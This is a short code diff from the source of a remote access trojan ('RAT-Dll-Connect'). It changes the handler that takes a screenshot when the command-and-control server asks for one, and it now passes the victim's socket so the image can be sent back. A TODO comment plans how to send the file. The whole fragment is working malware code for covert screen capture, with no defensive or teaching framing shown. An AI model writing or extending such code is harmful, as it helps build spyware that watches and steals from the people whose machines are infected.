@@ -348,13 +348,15 @@ INT startListen()
             // C2 says to take a screenshot 
             else if (strcmp((const char*)&recvBuf, SCREENSHOT) == 0)
             {
-                status = doScreenshot();
+                status = performScreenshot(clientSock);
                 if (status != SUCCESS)
                 {
-                    sprintf_s(msgBuf, "RAT-Dll-Connect::startListen - Failure recevied from doScreenshot %d\n", status);
+                    sprintf_s(msgBuf, "RAT-Dll-Connect::startListen - Failure recevied from performScreenshot %d\n", status);
                     OutputDebugStringA(msgBuf);
                     goto cleanup;
                 }
+
+                // TODO: change this so we pass a file handle maybe? then do sendback here along with success code 
 
             }
         }
